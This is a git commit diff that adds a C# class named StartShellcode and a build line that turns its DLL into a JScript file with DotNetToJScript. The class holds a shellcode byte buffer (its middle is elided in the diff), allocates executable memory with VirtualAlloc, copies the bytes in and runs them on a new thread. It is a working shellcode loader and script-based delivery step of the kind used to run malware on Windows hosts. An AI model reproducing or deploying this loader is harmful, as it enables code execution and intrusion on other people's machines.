136ef07bedd98bef23acdd61fdee75223bcc66f3
Peter Hoch <peter-hoch@users.noreply.github.com>
2025-04-11 18:35:10 +0200

    StartShellcode added

---
+++ StartShellcode/TestClass.cs
@@ -0,0 +1,46 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace StartShellcode
+{
+    using System.Diagnostics;
+    using System.Runtime.InteropServices;
+
+    [ComVisible(true)]
+    public class TestClass
+    {
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll")]
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+        public TestClass()
+        {
+
+
+            byte[] buf = new byte[659] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
+                ...
+            0xb5,0xa2,0x56,0xff,0xd5};
+
+
+            int size = buf.Length;
+            uint allocSize = (uint)size + 100;
+
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, allocSize, 0x3000, 0x40);
+
+            Marshal.Copy(buf, 0, addr, size);
+
+            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+        }
+
+    }
+}
--- create.ps1
+++ create.ps1
@@ -1,3 +1,5 @@
 .\DotNetToJScript\bin\x64\Release\DotNetToJScript.exe .\ExampleAssembly\bin\x64\Release\ExampleAssembly.dll --lang=Jscript --ver=v4 -o ExampleAssembly.js
 
 .\DotNetToJScript\bin\x64\Release\DotNetToJScript.exe .\StartCalculator\bin\x64\Release\StartCalculator.dll  --lang=Jscript --ver=v4 -o StartCalculator.js -c StartCalculator.TestClass
+
+.\DotNetToJScript\bin\x64\Release\DotNetToJScript.exe .\StartShellcode\bin\x64\Release\StartShellcode.dll  --lang=Jscript --ver=v4 -o StartShellcode.js -c StartShellcode.TestClass
